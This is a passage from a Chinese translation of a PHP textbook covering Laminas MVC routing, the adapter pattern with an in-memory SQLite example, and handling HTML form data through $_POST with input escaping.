                    ],
                ],
            ],
        ],
    ],
    'application' => [
        'type' => Segment::class,
        'options' => [
            'route' => '/application[/:action]',
            'defaults' => [
                'controller' => Controller\IndexController::class,
                'action' => 'index',
            ],
        ],
    ],
    'helloworld' => [
        'type' => Literal::class,
        'options' => [
            'route' => '/helloworld',
            'defaults' => [
                'controller' => Controller\HelloWorldController::class,
                'action' => 'index',
            ],
        ],
    ],
],
],
],
],
],
],
'controllers' => [
    'factories' => [
        Controller\IndexController::class => InvokableFactory::class,
        Controller\HelloWorldController::class => InvokableFactory::class,
    ],
],
'view_manager' => [
    'display_not_found_reason' => true,
    'display_exceptions' => true,
    'doctype' => 'HTML5',
    'not_found_template' => 'error/404',
    'exception_template' => 'error/index',
    'template_map' => [
        'layout/layout' => __DIR__ . '/../view/layout/layout.phtml',
        'application/index/index' => __DIR__ . '/../view/application/index/index.phtml',
        'error/404' => __DIR__ . '/../view/error/404.phtml',
        'error/index' => __DIR__ . '/../view/error/index.phtml',
    ],
    'template_path_stack' => [
        __DIR__ . '/../view',
    ],
],
];
```

清单 12.4 路由 ("module/Application/config/module.config.php")

现在在浏览器中访问 http://localhost:8080/helloworld。所需的应用程序将连同幸运数字一起出现（参见图 12.6）。

![](img/ae7820c36e8f24c1623d26668b28e80e_392_0.png)

图 12.6 模型中的数据在视图中显示

## 12.3 适配器和工厂

*工厂* 是一种模式，你可以用它——用有些简化的说法——在不事先指定类的情况下创建不同的对象实例。实例是由方法创建的，而不是由构造函数创建的。

另一种模式是 *适配器*。这通常是一个带有固定接口的类，可用于通信。适配器随后将指向该接口的请求转发到底层对象，这些对象可能具有完全不同的接口。例如，在 Laminas 中使用数据库时就会出现这种情况。`Laminas\Db\Adapter\Adapter` 类正是为此而存在；要使用的具体数据库由配置指定。通用适配器可与一整套兼容的数据库系统一起使用。另一方面，我们的应用程序代码只需“应对”适配器。优势在于，特定于数据库的对象可以互换（因为适配器处理通信，而不是我们的代码），适配器本身也可以互换（归功于固定接口）。

以下指令允许你使用 SQLite 数据库。“配置字符串” (`Pdo_Sqlite`) 指定所使用的数据库驱动程序：

```
$db = new \Laminas\Db\Adapter\Adapter(
[
    "driver" => "Pdo_Sqlite",
    "database" => ":memory:",
]
);
```

如你所见，后台使用的（负责与数据库进行实际通信的驱动程序，顺便一提是 `Zend_Db_Adapter_Pdo_Sqlite`）并未明确指定。





# 第三部分

### Web 技术

文件 vendor/laminas/laminas-db/src/Adapter/Adapter.php 说明了此工作原理。以下是摘录：

```php
$driverName = strtolower($parameters['driver']);
switch ($driverName) {
    case 'mysqli':
        $driver = new Driver\Mysqli\Mysqli($parameters, null, null, $options);
        break;
    // ...
    case 'pdo':
    default:
        if ($driverName === 'pdo' || strpos($driverName, 'pdo') === 0) {
            $driver = new Driver\Pdo\Pdo($parameters);
        }
}
```

因此，Driver\Pdo\Pdo 驱动程序是在我们的代码未显式请求甚至未知晓该类的情况下创建的。严格来说，这不是工厂，因为未使用工厂方法，但原理显而易见（且可比较）。

此适配器将用于现有的 MVC 应用程序。首先，有必要安装 laminas-db 包。为此，请直接在项目目录中执行以下命令：

composer require laminas/laminas-db

随后，系统将询问您是否要在配置中保存新包（参见图 12.7）。默认答案 `1` 是个不错的选择。之后，您可以从应用程序访问 Laminas\Db。

![](img/ae7820c36e8f24c1623d26668b28e80e_393_0.png)

图 12.7 安装 laminas-db

> **注意**
> 截至出版时，laminas-db 仅与 PHP 8.0 至 8.2 版本兼容，因此我们无法使用 PHP 8.3 复制以下步骤。

回到实际实现。适配器用于执行以下操作：

- 1. 在内存中创建 SQLite 数据库。
- 2. 创建表。
- 3. 用六个随机数填充表。
- 4. 读取这六个随机数。
- 5. 删除表。

前提是在 php.ini 中启用 pdo_sqlite 扩展（第 18 章将详细介绍）。以下清单包含完整代码，直接添加到上一示例的模型文件中。

```php
<?php
namespace Application\Model;

class HelloWorld {
public $numbers;

function __construct() {
$numbers = [];

$db = new \Laminas\Db\Adapter\Adapter(
[
"driver" => "Pdo_Sqlite",
"database" => ":memory:",
]
);

$db->query(
'CREATE table numbers (number INTEGER)',
\Laminas\Db\Adapter\Adapter::QUERY_MODE_EXECUTE);

for ($i = 0; $i < 6; $i++) {
$db->query(
'INSERT INTO numbers (number) VALUES (?)',
[rand(1, 49)]);
}

$stmt = $db->query('SELECT * FROM numbers');
$rows = $stmt->execute();
foreach ($rows as $row) {
    array_push($numbers, $row['number']);
}

$db->query(
    'DROP TABLE numbers',
    \Laminas\Db\Adapter\Adapter::QUERY_MODE_EXECUTE
);

$this->numbers = $numbers;
}
?>
```

清单 12.5 适配器模式（"module/Application/src/Model/HelloWorld.php"）

现在只需更新视图。数字列表将快速按数值排序，然后用逗号分隔输出。

```php
<div id="welcome">
<h1>Hello world!</h1>

<p>Your personal lucky numbers are: <b>
<?php
$numbers = $this->data->numbers ?? [];

usort(
    $numbers,
    function ($a, $b) {
        return $a - $b;
    }
);

echo implode(", ", $numbers);
?>
</b></p>
</div>
```

清单 12.6 已更新的视图（"module/Application/view/application/hello-world/index.phtml"）

您可以在图 12.8 中看到最终结果。数据库中的随机数已传输到视图并在那里排序。

![](img/ae7820c36e8f24c1623d26668b28e80e_396_0.png)

图 12.8 数据库中的随机数（在主内存中创建）

四人帮（Gang of Four）之一的 Erich Gamma 曾报道过一篇新闻组帖子，其中作者非常沮丧，因为他只使用了 Gamma 及其同事著作中 23 种设计模式中的 20 种。在使用模式时，务必兼顾务实精神与批判性审查。然而，若使用得当，模式可以提高软件的可维护性和质量。

# 第 13 章

# 表单

表单是网站访问者与网站本身进行某种形式通信的重要方式，若非最重要方式也是如此。足以深入了解 PHP 的控制。

在学习 HTML 时，表单通常扮演着相当次要的角色。在培训课程中我们也注意到这一点：参与者通常对 HTML 有深入了解，但如果询问表单元素的具体细节，往往会看到困惑的面孔。

这引发两个问题：为什么 HTML 表单通常不被视为非常重要，以及为什么我们在本章（非常详尽的章节）中对这一主题如此重视？

答案已在引言中给出：表单用于网站访问者与网站本身之间的通信。否则，通信仅限于点击链接，这当然不太令人兴奋。不过，通过表单，用户可以输入数据，随后可在服务器端进一步处理。

本章展示了如何实现这一点。同时，它还解释了可能出现的风险、需要注意的事项以及可用的特殊应用。检查表单数据也很重要（例如，是否填写了所有字段？）。所有这些在实践中非常常见，但有时在文献中被忽略。在本章中，您将获得完整的方案。

但是，为什么 PHP 等服务器端技术对表单处理如此重要？答案是：由于 HTML 和 JavaScript 的可能性有限，如果没有 PHP（或竞争技术），就无法处理数据。

## 13.1 准备工作

PHP 表单支持不需要任何安装。然而，所必需的是对 HTML 表单元素的基本了解。本章大多数示例将围绕一个非常具体的示例表单展开，您可以在其中订购重大体育赛事的门票。门票买得早一点永远不为过：下次一定会更好。许多相关的表单元素出现在这个表单中——无论是巧合还是故意。该表单在以下清单中。

```html
<html>
<head>
<title>Order Form</title>
</head>
<body>
<h1>World Cup Ticket Service</h1>
<form>
<input type="radio" name="Salutation" value="Mr. " />
Mr.
<input type="radio" name="Salutation" value="Ms. " />
Ms. <br />
First name <input type="text" name="FirstName" /><br />
Last name<input type="text" name="LastName" /><br />
Email address <input type="text" name="Email" /><br />
Promo code <input type="password" name="Promo" /><br />
Number of tickets
<select name="Number">
<option value="0">Please select</option>
<option value="1">1</option>
<option value="2">2</option>
<option value="3">3</option>
<option value="4">4</option>
</select><br />
Desired section in the stadium
<select name="Section[]" size="4" multiple="multiple">
<option value="north">North</option>
<option value="south">South</option>
<option value="east">East</option>
<option value="west">West</option>
</select><br />
Comments/Notes
<textarea cols="70" rows="10" name="Comments"></textarea><br />
<input type="checkbox" name="Terms" value="ok" />
I accept the terms &amp; conditions.<br />
<input type="submit" name="Submit" value="Place order" />
</form>
</body>
</html>
```

清单 13.1 订单表单——尚未使用 PHP（"form.html"）

在本章中，此表单（参见图 13.1）将逐步扩展，每个中间步骤均作为单独文件在本书的在线材料中提供。首先，我们读取表单中的数据，然后转向更高级的任务，例如检查输入的数据。

![](img/ae7820c36e8f24c1623d26668b28e80e_401_0.png)

图 13.1 原始表单

表 13.1 对所使用的表单元素进行了简要概述，包括预分配选项（这在以后进行表单验证时是必要的）。

| HTML 元素 | 描述 | 预分配 |
|---|---|---|
| `<input type="text" />` | 单行文本字段 | `value="value"` |
| `<input type="password" />` | 单行密码字段 | `value="value"` |
| `<textarea></textarea>` | 多行文本字段 | 介于 `<textarea>` 和 `</textarea>` 之间 |
| `<input type="radio" />` | 单选按钮 | checked 属性 |
| `<input type="checkbox" />` | 复选框 | checked 属性 |
| `<select><option></option></select>` | 选择列表 | selected 属性 |
| `<input type="submit" />` | 发送按钮 | 不适用 |

表 13.1 所用表单元素概述





## 13.2 使用 PHP 的表单

许多人，尤其是微软员工，都会问自己：PHP 是如何获得其惊人的市场份额的？这当然有很多原因，但一个被特别频繁地提及：起初，处理表单数据尤其容易。

本书的作者还撰写过几本更通用的网页出版书籍，并在早期版本中介绍过 Perl。下面是这些书籍中一段 2004 年的摘录，是一个 Perl 脚本，用于访问和输出表单中的数据：

```
#!/usr/bin/perl
print "Content-type: text/html\n\n";
if ($ENV{"REQUEST_METHOD"} eq "POST") {
read(STDIN, $data, $ENV{"CONTENT_LENGTH"});
} else {
$data = $ENV{"QUERY_STRING"};
}
@pairs = split(/&/, $data);
foreach $pairs (@pairs) {
$pairs =~ tr/+/ /;
$pairs =~ s/%(..)/pack("C", hex($1))/eg;
($name, $value) = split("=", $pairs);
$form{$name} = $value;
}
foreach $name (keys($form))
{
print "<b>$name: </b>$form{$name}<br />\n";
}
```

与原版相比，这段代码已被稍作精简。此清单的问题在于，如果不了解 Perl，很难轻松理解。PHP 尤其是在早期，被视为 Perl 的竞争对手，并且有一个强大的优势：它更加简单。如今，Perl 在 Web 领域早已被 PHP 抛在了身后。

尽管如此，我们在此还是要为 Perl 说几句公道话。我们过去常常大量使用它，尤其是在早期。Perl 常被戏称为“瑞士链锯”，因为它功能强大无比。PHP 当然更适合 Web 使用，因为它是专门为 Web 开发的，因此拥有许多需要在 Perl 中后期补全的功能。前面那段输出所有表单数据的代码就是一个例子。Perl 还有一个著名的 CGI.pm 模块，可以极大地简化这一过程。原则上，用 Perl 可以做任何事情——但这大概是另一本书的主题了。

### 13.2.1 美好的“旧时光”

回到 PHP 话题。表单处理曾经极其简单。这门语言的发明者 Rasmus Lerdorf 曾自问：我希望如何访问名为 field 的表单字段（即其 name 属性值为 “field”）中的数据？答案既简单又妙绝：使用 $field。

这就是全部诀窍：当表单被提交时，PHP 会自动创建与所用表单字段同名的变量。这几乎不可能再简单了。下面的脚本曾输出所有表单数据（注意用了过去时！）。要看到任何内容，你当然首先必须填写表单并提交。

```
<html>
<head>
<title>Order Form</title>
</head>
<body>
<h1>Form Data</h1>
<?php
echo "Salutation: $Salutation<br />";
echo "First name: $FirstName<br />";
echo "Last name: $LastName<br />";
echo "Email: $Email<br />";
echo "Promo code: $Promo<br />";
echo "Number of tickets: $Number<br />";
echo "Section: $Section<br />";
echo "Comments: $Comments<br />";
echo "Terms &amp; conditions: $Terms";
?>

<h1>World Cup Ticket Service</h1>
<form>
<input type="radio" name="Salutation" value="Mr."
/>Mr.
<input type="radio" name="Salutation" value="Ms."
/>Ms. <br />
First name <input type="text" name="FirstName" /><br />
Last name<input type="text" name="LastName" /><br />
Email address <input type="text" name="Email" /><br />
Promo code <input type="password" name="Promo" /><br />
Number of tickets
<select name="Number">
<option value="0">Please select</option>
<option value="1">1</option>
<option value="2">2</option>
<option value="3">3</option>
<option value="4">4</option>
</select><br />
Desired section in the stadium
<select name="Section[]" size="4" multiple="multiple">
<option value="north">North</option>
<option value="south">South</option>
<option value="east">East</option>
<option value="west">West</option>
</select><br />
Comments/Notes
<textarea cols="70" rows="10" name="Comments"></textarea><br />
<input type="checkbox" name="Terms" value="ok" />
I accept the terms &amp; conditions.<br />
<input type="submit" name="Submit" value="Place order" />
</form>
</body>
</html>
```

### 清单 13.2 简单输出表单数据（“form-output-php3.php”）

图 13.2 展示了脚本的输出，就像在很久很久以前的 PHP 中所见到的一样。不过，如果你亲自尝试，几乎肯定会得到如图 13.3 所示的结果——要么是错误消息，要么完全没有输出。

![](img/ae7820c36e8f24c1623d26668b28e80e_404_0.png)

### 图 13.2 它曾起作用 …

原因何在？这种方法虽然简单，却也助长了草率的编程习惯。更糟的是，它允许用户（因此也包括攻击者）只需发送一个相应的表单（或将数据附加到 URL 上），就能在 PHP 脚本中创建变量。

![](img/ae7820c36e8f24c1623d26668b28e80e_405_0.png)

图 13.3 ……或者没有？

出于这个原因，经过一场漫长的、充满争议的讨论（PHP 发明者 Lerdorf 站在“维持原状”派一边）之后，PHP 开发者决定做出改变：引入了一个配置选项，以防止访问由表单数据生成的全局变量。此功能在 PHP 5.5 中已被完全移除，因此这种不安全的简短访问（为了履行编年史家的义务；该选项名为 register_globals）所幸已不再可能。

当然，本书中我们使用另一种同样可靠的方法。我们依赖于包含表单数据的特殊可用数组。

### 全局数组 vs. 超全局数组

我们所说的数组称为 _超全局数组_。这是什么意思？在早期的 PHP 版本中，已经存在存储表单数据的数组：

- $HTTP_POST_VARS
- $HTTP_GET_VARS
- $HTTP_COOKIE_VARS
- $HTTP_SERVER_VARS
- $HTTP_POST_FILES

这些数组是全局的，但仅在主程序中。在函数中，你必须手动使用 `global` 将这些数组获取到全局上下文中：

```
function AnyFunction() {
    global $HTTP_POST_VARS;
}
```

不过，超全局数组更进一步：它们在函数内部也是全局的——也就是说，是超全局的。因此，你此时不需要使用 `global`。

不过，本书不使用 $HTTP_*_VARS 数组的主要原因有所不同：就像全局表单数据（$fieldname）一样，这种模式自 PHP 5.5 起已不可用。而且在此之前，该功能也可以被禁用；_php.ini_ 设置名为 register_long_arrays。

### 13.2.2 HTTP 方法

但是，表单提交时到底发生了什么？在 <form> HTML 元素中，method 属性至关重要。这里指定了表单数据应如何发送，通过 GET 或 POST：¹

- method="get"
  表单数据作为简单的名称-值对附加到 URL 上：
  http://server/script.php?Fieldname1=Fieldvalue1&Fieldname2=Fieldvalue2
  每个名称-值对由表单字段的名称（name 属性）、一个等号和字段中的值组成。各个对之间用和号（&）符号分隔。

- method="post"
  数据会被转换回名称-值对，但这些对会在 HTTP 请求正文中发送，不会出现在地址中。

> 注意
> 如果未指定 method 的值，浏览器会自动使用 GET。

> POST vs. GET
> 自然会产生这样一个问题：哪种更可取，GET 还是 POST？我们将列出两种变体的一些优点和隐含的缺点。
> 对于 GET：
> - 目标页面可以保存为书签/收藏夹。
> - 由于数据可见，调试有时更容易。
> - 目标页面可以被搜索引擎抓取（前提是 URL 中的参数不过多）。
> POST 不言自明：
> - 表单数据在浏览器历史记录中不可见（安全！）。
> - Web 服务器和浏览器对 URL 长度有限制，使用 GET 会是个问题，但使用 POST 则不会。
> - POST 也可用于发送文件（第 13.5 节）。
> - POST 请求不会进入浏览器缓存。
> 因此，当表单被主动发送时，通常使用 POST。向页面传输数据，例如在内容管理系统（CMS）中，建议使用 GET。例如，新闻文章的编号会在 URL 中指定。

¹ 还有其他 HTTP 方法，但在 Web 应用程序中较少使用（API 除外）。





现在来看超全局数组：`$_REQUEST` 包含所有表单数据（也包括 cookie；参见第 14 章），无论你使用 GET 还是 POST。访问 `$_POST` 和 `$_GET` 特殊数组来分别处理 POST 和 GET 数据更合理。

表单发送的目标（对 GET 和 POST 均适用）在 `<form>` 标签的 action 属性中指定。使用 GET 时，表单数据也会自动附加到此地址。然而，大多数 PHP 脚本都是这样的：表单本身和用于处理表单数据的 PHP 代码都在同一个文件中。这样做的一个优点是，所有内容都清晰地安排在一处。在许多教程中，你现在会看到建议为表单配置操作——在本例中，如下所示：

```
<form action="<?php echo $PHP_SELF; ?>">
```

`$PHP_SELF` 变量包含当前脚本的 URL。这取决于配置——但始终有效的是 `$_SERVER["PHP_SELF"]`。但这通常不是必需的。如果没有设置 action 会发生什么？让我们来看看 W3C HTML 规范。在 `http://s-prs.co/v602217` 中，它说明对于 HTML 4，如果未设置该属性，浏览器的行为是未定义的；在 (X)HTML 的 DTD 中，action 被标记为必需属性（#REQUIRED）。但是，此限制在 HTML5 中已不再存在。使用 action="" 仍然是良好风格。

然而，在实际中情况有所不同。如果 Web 浏览器找不到 action 属性，它会自动将当前表单发送到当前脚本，这正是我们在这里想要做的。虽然这在任何地方都没有规定，但所有相关浏览器都实现了这一点。但即便如此，这也是危险的：

```
<form action="<?php echo $_SERVER["PHP_SELF"]; ?>">
```

这是因为在某些情况下，`$_SERVER["PHP_SELF"]` 包含当前脚本的完整路径，包括任何 URL 附加内容。但是，攻击者随后能够将恶意 JavaScript 代码附加到地址——造成危险后果（关于各种安全问题的更多信息，请参见第 32 章）。因此，你必须先从输出中删除特殊字符（如双引号和尖括号）。这可以使用 `htmlspecialchars()` 函数完成，该函数以后将更频繁地使用：

```
<form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>">
```

接下来，我们将逐步向表单添加代码，以输出输入的数据。我们将根据表单字段类型进行操作。这样做的优点是，你最终不仅可以使用示例表单，还可以使用任何表单；表单字段类型始终相同。

首先，有两点重要说明：

- 由于表单输入也可能包含 HTML 特殊字符，因此所有输出都首先使用 `htmlspecialchars()` 转换为 HTML。

如果在字段中没有输入任何内容，或者表单尚未发送，则访问 `$_POST["field name"]`/`$_GET["field name"]` 可能会导致 PHP 警告。因此，我们首先使用 `isset()` 检查所需条目是否确实存在于 `$_POST`/`$_GET` 数组中：
if (isset($_GET["Field name"])) {
    // ...
}

> Note
> 我们在此始终使用 POST，而不是 GET，因此始终使用 `$_POST` 访问表单数据。如果你在表单中使用 GET，则必须同样编写 `$_GET`。否则，其他方面不会有任何变化。PHP 还会自动处理 URL 中的任何特殊字符编码（及其反向转换）。

> Note
> 还有另一个事先重要的说明：HTML 对表单字段名区分大小写，因此在命名表单字段时请注意这一点。通过 PHP 访问时也有相同的限制：Field、field 和 FIELD 是三个不同的表单字段标识符。

### 13.2.3 文本字段

访问文本字段中的值非常简单：文本字段的值位于 `$_GET["Field"]` 或 `$_POST["Field"]` 中。文本字段的一个特别好用的功能是，即使字段中没有输入任何内容，`$_GET["Field"]` 或 `$_POST["Field"]` 始终已设置，因此可以省略 `isset()` 检查（如果在其他地方已检查表单是否已发送）。尽管如此，执行检查仍然是良好风格。许多攻击者始终在寻找错误消息（因为它们非常揭示性——即使只给出 PHP 文件的绝对路径）并喜欢向脚本发送特制（或空）表单以查看会发生什么。生成错误消息的另一种方法是操纵 HTTP 请求。这样，攻击者可以确保 `$_GET["Field"]` 或 `$_POST["Field"]` 是一个无法对其应用 `htmlspecialchars()` 的数组。这里也有一个简单的补救方法：首先使用 `is_string()` 检查是否确实存在字符串。

> Note
> 大多数语义表单字段——例如 `<input type="email">`、`<input type="url">` 等等——表现得像文本字段；也就是说，有一个字段名和一个关联的值。

清单 13.3 显示了输出文本字段内容的代码（另参见图 13.4）。对于文本和密码字段很简单，但多行文本字段有一个特殊功能：文本中也可以换行。这些使用 PHP 函数 `nl2br()` 正确转换。

> **Note**
>
> 使用 `nl2br()` 进行转换时，必须先使用 `htmlspecialchars()`，然后再将换行符替换为 `<br />`。原因是如果你反向操作，你会先得到 `<br />`，然后由于 `htmlspecialchars()` 而得到字符 `&lt;br /&gt;`，这肯定不是你想要的。

```
<body>
<h1>Form Data</h1>
<?php
$Firstname = (isset($_POST["FirstName"]) && is_string($_POST["FirstName"])) ?
$_POST["FirstName"] : "";
$Lastname = (isset($_POST["LastName"]) && is_string($_POST["LastName"])) ?
$_POST["LastName"] : "";
$Email = (isset($_POST["Email"]) && is_string($_POST["Email"])) ?
$_POST["Email"] : "";
$Promo = (isset($_POST["Promo"]) && is_string($_POST["Promo"])) ?
$_POST["Promo"] : "";
$Comments = (isset($_POST["Comments"]) && is_string($_POST["Comments"])) ?
$_POST["Comments"] : "";
$Firstname = htmlspecialchars($Firstname);
$Lastname = htmlspecialchars($Lastname);
$Email = htmlspecialchars($Email);
$Promo = htmlspecialchars($Promo);
$Comments = nl2br(htmlspecialchars($Comments));
echo "<b>First name:</b> $Firstname<br />";
echo "<b>Last name:</b> $Lastname<br />";
echo "<b>Email:</b> $Email<br />";
echo "<b>Promo:</b> $Promo<br />";
echo "<b>Comments:</b> $Comments<br />";
?>
<h1>World Cup ticket service</h1>
<form method="post">
```

### 清单 13.3 文本字段数据输出（摘录自 "form-output-textfields.php"）

> **Tip**
>
> 你可以以完全相同的方式访问隐藏表单字段（`<input type="hidden" />`）！

![](img/ae7820c36e8f24c1623d26668b28e80e_410_0.png)

图 13.4 文本字段的值显示

### 13.2.4 单选按钮

单选按钮在表单元素中占据特殊地位。通常，每个字段名都是唯一的。然而，对于单选按钮，属于单选按钮组的所有单选按钮的 name 属性值都相同。组内只能选择一个单选按钮。因此，组内的单选按钮在名称上没有区别，而在值（value 属性）上有区别。然而，这使得访问变得简单直观：`$_GET["Field name"]` 或 `$_POST["Field name"]` 包含所选单选按钮的值（如果没有单击任何单选按钮，则未设置）。

> > **Note**
> > 只使用单选按钮的值，而不使用其标签！！

```
<h1>Form Data</h1>
<?php
$Salutation = (isset($_POST["Salutation"]) && is_string($_POST["Salutation"]))
?
$_POST["Salutation"] : "";
$Firstname = (isset($_POST["FirstName"]) && is_string($_POST["FirstName"])) ?
$_POST["FirstName"] : "";
$Lastname = (isset($_POST["LastName"]) && is_string($_POST["LastName"])) ?
$_POST["LastName"] : "";
$Email = (isset($_POST["Email"]) && is_string($_POST["Email"])) ?
$_POST["Email"] : "";
$Promo = (isset($_POST["Promo"]) && is_string($_POST["Promo"])) ?
$_POST["Promo"] : "";
$Comments = (isset($_POST["Comments"]) && is_string($_POST["Comments"])) ?
$_POST["Comments"] : "";
$Salutation = htmlspecialchars($Salutation);
$Firstname = htmlspecialchars($Firstname);
```





```php
$Lastname = htmlspecialchars($Lastname);
$Email = htmlspecialchars($Email);
$Promo = htmlspecialchars($Promo);
$Comments = nl2br(htmlspecialchars($Comments));
echo "<b>Salutation:</b> $Salutation<br />";
echo "<b>First name:</b> $Firstname<br />";
echo "<b>Last name:</b> $Lastname<br />";
echo "<b>Email:</b> $Email<br />";
echo "<b>Promo:</b> $Promo<br />";
echo "<b>Comments:</b> $Comments<br />";
?>
```

### 清单 13.4 单选按钮的输出（摘录自 “form-output-radiobuttons.php”）

![](img/ae7820c36e8f24c1623d26668b28e80e_411_0.png)

### 图 13.5 已识别称呼

### 13.2.5 复选框

某些 HTML 说明建议将复选框分组，并为组中的每个复选框赋予相同的名称。然而，这毫无意义，因为复选框并不存在分组。每个复选框都是独立的；HTML 不提供诸如“仅可选中这五个复选框中的三个”这类限制。为此，你需要使用 JavaScript。

基于这一前提，很容易理解 PHP 如何访问复选框：如果已选中复选框，$_GET["Field"] 或 $_POST["Field"] 包含复选框的值；如果未选中，则数组元素不存在。

> **提示**
>
> 总有人会省略复选框的 value 属性。在这种情况下，如果已选中复选框，浏览器会传输 "on" 值。尽管如此，你不应依赖此行为，而应始终使用 value 属性。

```php
<h1>Form Data</h1>
<?php
$Salutation = (isset($_POST["Salutation"]) && is_string($_POST["Salutation"])) ?
$_POST["Salutation"] : "";
$Firstname = (isset($_POST["FirstName"]) && is_string($_POST["FirstName"])) ?
$_POST["FirstName"] : "";
$Lastname = (isset($_POST["LastName"]) && is_string($_POST["LastName"])) ?
$_POST["LastName"] : "";
$Email = (isset($_POST["Email"]) && is_string($_POST["Email"])) ?
$_POST["Email"] : "";
$Promo = (isset($_POST["Promo"]) && is_string($_POST["Promo"])) ?
$_POST["Promo"] : "";
$Comments = (isset($_POST["Comments"]) && is_string($_POST["Comments"])) ?
$_POST["Comments"] : "";
$Terms = (isset($_POST["Terms"]) && is_string($_POST["Terms"])) ?
$_POST["Terms"] : "";
$Salutation = htmlspecialchars($Salutation);
$Firstname = htmlspecialchars($Firstname);
$Lastname = htmlspecialchars($Lastname);
$Email = htmlspecialchars($Email);
$Promo = htmlspecialchars($Promo);
$Comments = nl2br(htmlspecialchars($Comments));
$Terms = htmlspecialchars($Terms);
echo "<b>Salutation:</b> $Salutation<br />";
echo "<b>First name:</b> $Firstname<br />";
echo "<b>Last name:</b> $Lastname<br />";
echo "<b>Email:</b> $Email<br />";
echo "<b>Promo:</b> $Promo<br />";
echo "<b>Comments:</b> $Comments<br />";
echo "<b>Terms &amp; conditions:</b> $Terms<br />";
?>
```

### 清单 13.5 复选框的输出（摘录自 “form-output-checkboxes.php”）

![](img/ae7820c36e8f24c1623d26668b28e80e_412_0.png)

### 图 13.6 已接受条款和条件

### 13.2.6 选择列表

即使是选择列表，使用 $_GET["Field name"] 或 $_POST["Field name"] 也能非常简单地访问。你将收到用户选中的列表元素（<option>）的值（value 属性）。

> **提示**
>
> 这里又会出现一个问题：如果没有 value 属性会怎样？在这种情况下，答案是使用标签，即 <option> 和 </option> 之间的内容。此处亦然：不要依赖此行为，而应始终为每个列表元素设置 value 属性。

```php
<h1>Form Data</h1>
<?php

$Salutation = (isset($_POST["Salutation"]) && is_string($_POST["Salutation"])) ?
$_POST["Salutation"] : "";
$Firstname = (isset($_POST["FirstName"]) && is_string($_POST["FirstName"])) ?
$_POST["FirstName"] : "";
$Lastname = (isset($_POST["LastName"]) && is_string($_POST["LastName"])) ?
$_POST["LastName"] : "";
$Email = (isset($_POST["Email"]) && is_string($_POST["Email"])) ?
$_POST["Email"] : "";
$Promo = (isset($_POST["Promo"]) && is_string($_POST["Promo"])) ?
$_POST["Promo"] : "";
$Number = (isset($_POST["Number"]) && is_string($_POST["Number"])) ?
$_POST["Number"] : "";
$Comments = (isset($_POST["Comments"]) && is_string($_POST["Comments"])) ?
$_POST["Comments"] : "";
$AGB = (isset($_POST["AGB"]) && is_string($_POST["AGB"])) ?
$_POST["AGB"] : "";
$Salutation = htmlspecialchars($Salutation);
$Firstname = htmlspecialchars($Firstname);
$Lastname = htmlspecialchars($Lastname);
$Email = htmlspecialchars($Email);
$Promo = htmlspecialchars($Promo);
$Number = htmlspecialchars($Number);
$Comments = nl2br(htmlspecialchars($Comments));
$AGB = htmlspecialchars($AGB);
echo "<b>Salutation:</b> $Salutation<br />";
echo "<b>First name:</b> $Firstname<br />";
echo "<b>Last name:</b> $Lastname<br />";
echo "<b>Email:</b> $Email<br />";
echo "<b>Promo:</b> $Promo<br />";
echo "<b>Number of tickets:</b> $Number<br />";
echo "<b>Comments:</b> $Comments<br />";
echo "<b>Terms &amp; conditions:</b> $AGB<br />";
?>
```

### 清单 13.6 所选列表元素的输出（摘录自 "form-output-selectlists.php"）

![](img/ae7820c36e8f24c1623d26668b28e80e_414_0.png)

### 图 13.7 来自选择列表的数据

多选列表的情况略有不同，因为可以一次返回多个值。你可能已经在选择列表的 HTML 代码中注意到一个特殊之处。这里再次列出：

```html
<select name="Section[]" size="4" multiple="multiple">
<option value="north">North</option>
<option value="south">South</option>
<option value="west">West</option>
<option value="east">East</option>
</select>
```

因此，列表的名称以 [] 结尾。你可能已经猜到其意图：这向 PHP 表明这是一个多选列表，且其中的数据应存储在一个数组中。这就是全部诀窍：在 $_GET["field name"] 或 $_POST["field name"] 中，多选列表包含一个带有所有选中列表元素值的数组。（因此我们可以省略 is_string() 检查，改用 is_array()！）下方清单中的代码读取此数据。

```php
<h1>Form Data</h1>
<?php
$Salutation = (isset($_POST["Salutation"]) && is_string($_POST["Salutation"])) ?
$_POST["Salutation"] : "";
$Firstname = (isset($_POST["FirstName"]) && is_string($_POST["FirstName"])) ?
$_POST["FirstName"] : "";
$Lastname = (isset($_POST["LastName"]) && is_string($_POST["LastName"])) ?
$_POST["LastName"] : "";
$Email = (isset($_POST["Email"]) && is_string($_POST["Email"])) ?
$_POST["Email"] : "";
$Promo = (isset($_POST["Promo"]) && is_string($_POST["Promo"])) ?
$_POST["Promo"] : "";
$Number = (isset($_POST["Number"]) && is_string($_POST["Number"])) ?
$_POST["Number"] : "";
$Section = (isset($_POST["Section"]) && is_array($_POST["Section"])) ?
$_POST["Section"] : [];
$Comments = (isset($_POST["Comments"]) && is_string($_POST["Comments"])) ?
$_POST["Comments"] : "";
$Terms = (isset($_POST["Terms"]) && is_string($_POST["Terms"]))
? $_POST["Terms"] : "";
$Salutation = htmlspecialchars($Salutation);
$Firstname = htmlspecialchars($Firstname);
$Lastname = htmlspecialchars($Lastname);
$Email = htmlspecialchars($Email);
$Promo = htmlspecialchars($Promo);
$Number = htmlspecialchars($Number);
$Section = htmlspecialchars(implode(", ", $Section));
$Comments = nl2br(htmlspecialchars($Comments));
$Terms = htmlspecialchars($Terms);
echo "<b>Salutation:</b> $Salutation<br />";
echo "<b>First name:</b> $Firstname<br />";
echo "<b>Last name:</b> $Lastname<br />";
echo "<b>Email:</b> $Email<br />";
echo "<b>Promo:</b> $Promo<br />";
echo "<b>Number of tickets:</b> $Number<br />";
echo "<b>Section:</b> $Section<br />";
echo "<b>Comments:</b> $Comments<br />";
echo "<b>Terms &amp; conditions:</b> $Terms<br />";
?>
```

### 清单 13.7 所选列表元素的输出（摘录自 "form-output-multiselect-lists.php"）

![](img/ae7820c36e8f24c1623d26668b28e80e_415_0.png)

### 图 13.8 现在多选列表可以正常工作了





### 13.2.7 确定 HTTP 方法

如你所见，使用表单确定 HTTP 方法并不困难。不过，之前的脚本始终存在一个缺点：当首次调用表单时，表单值已经显示。由于此时用户尚未填写表单，这些数据毫无价值（因为为空）。因此，最好仅在表单已被提交时才显示这些信息。

实现此功能有几种方法。首先，你可以检查某个表单字段是否已填写——例如，文本字段：

```php
<?php
if (isset($_POST["LastName"]) && $_POST["LastName"] != "") {
    //Output data
}
?>
```

如果该字段为空，此方法会失效。但还有其他可能性。例如，PHP 会在环境变量中记住当前页面的调用方式：通过 GET 或 POST。因此，如果你使用 POST 表单（如本示例所示），查询非常简单：

```php
